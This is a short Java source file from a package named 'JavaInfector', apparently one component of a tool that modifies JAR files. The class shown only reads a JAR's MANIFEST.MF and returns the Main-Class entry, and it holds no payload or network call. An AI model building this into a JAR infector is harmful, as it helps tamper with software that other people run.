package jlxip.JavaInfector;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.regex.Pattern;

public class GetMainClass {
	public String run(String DESTDIR) {
		System.out.print("Locating main class...");
		String MC = "";
		File FMANIFEST = new File(DESTDIR + File.separator + "META-INF" + File.separator + "MANIFEST.MF");
		try{
			FileReader FRMANIFEST = new FileReader(FMANIFEST);
			BufferedReader BRMANIFEST = new BufferedReader(FRMANIFEST);
			
			String lastLine;
			while((lastLine = BRMANIFEST.readLine()) != null) {
				Pattern MainClass_pattern = Pattern.compile(Pattern.quote("Main-Class: "));
				String[] results = MainClass_pattern.split(lastLine);
				if(results.length>1) {
					MC = results[1];
				}
			}
			
			BRMANIFEST.close();
			FRMANIFEST.close();
			System.out.println("Done!");
		} catch(IOException e) {
			System.out.println("FAILED!");
			e.printStackTrace();
		}
		
		return MC;
	}
}
